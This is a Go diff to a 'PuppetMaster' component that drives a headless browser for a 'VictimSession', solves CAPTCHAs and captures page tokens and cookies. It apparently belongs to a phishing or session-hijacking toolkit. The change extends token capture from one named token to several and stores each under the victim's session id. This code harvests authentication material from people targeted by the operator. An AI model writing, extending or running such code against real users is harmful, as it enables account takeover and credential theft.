@@ -187,7 +187,7 @@ func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
 	if session.Trigger.OpenUrl != "" {
 		log.Info("[PUPPET] Navigating to %s", session.Trigger.OpenUrl)
 		_, err = page.Goto(session.Trigger.OpenUrl, playwright.PageGotoOptions{
-			WaitUntil: playwright.WaitUntilStateNetworkidle,
+			WaitUntil: playwright.WaitUntilStateLoad,
 			Timeout:   playwright.Float(60000),
 		})
 		if err != nil {
@@ -203,19 +203,45 @@ func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
 		return
 	}
 
-	// Detect and solve CAPTCHA
-	tokenValue, err := pm.detectAndSolveCaptcha(page, session.Trigger)
-	if err != nil {
-		log.Error("[PUPPET] Failed to solve CAPTCHA: %v", err)
-		session.Status = "failed"
-		session.Error = err.Error()
-		return
+	// Detect and solve CAPTCHA / Extract tokens
+	var firstToken string
+	tokensToCapture := session.Trigger.Tokens
+	if len(tokensToCapture) == 0 && session.Trigger.Token != "" {
+		tokensToCapture = []string{session.Trigger.Token}
 	}
 
-	// Store the token
-	session.TokenValue = tokenValue
-	pm.tokenStore.SetToken(session.VictimSession+"_"+session.Trigger.Token, tokenValue)
-	log.Success("[PUPPET] Token %s captured for session %s", session.Trigger.Token, session.VictimSession)
+	for _, tokenName := range tokensToCapture {
+		log.Info("[PUPPET] Attempting to extract token: %s", tokenName)
+		
+		// For now, we only solve CAPTCHA once if needed, and then extract tokens
+		// This is a simplified approach; in the future we might need per-token solutions
+		var tokenValue string
+		val, err := pm.detectAndSolveCaptcha(page, session.Trigger)
+		if err != nil {
+			log.Warning("[PUPPET] Failed to solve CAPTCHA for %s: %v", tokenName, err)
+		} else {
+			tokenValue = val
+		}
+
+		if tokenValue == "" {
+			val, err := pm.extractTokenFromPage(page, tokenName)
+			if err != nil {
+				log.Warning("[PUPPET] Failed to extract token %s: %v", tokenName, err)
+			} else {
+				tokenValue = val
+			}
+		}
+
+		if tokenValue != "" {
+			if firstToken == "" {
+				firstToken = tokenValue
+			}
+			pm.tokenStore.SetToken(session.VictimSession+"_"+tokenName, tokenValue)
+			log.Success("[PUPPET] Token %s captured for session %s", tokenName, session.VictimSession)
+		}
+	}
+
+	session.TokenValue = firstToken
 
 	// Extract cookies if configured
 	if session.Trigger.ExtractCookies {
@@ -249,7 +275,7 @@ func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
 	
 	log.Info("[PUPPET] Session %s completed successfully. Token: %s...", 
 		session.Id, 
-		shortenToken(tokenValue))
+		shortenToken(session.TokenValue))
 }
 
 // executeActions performs all configured actions
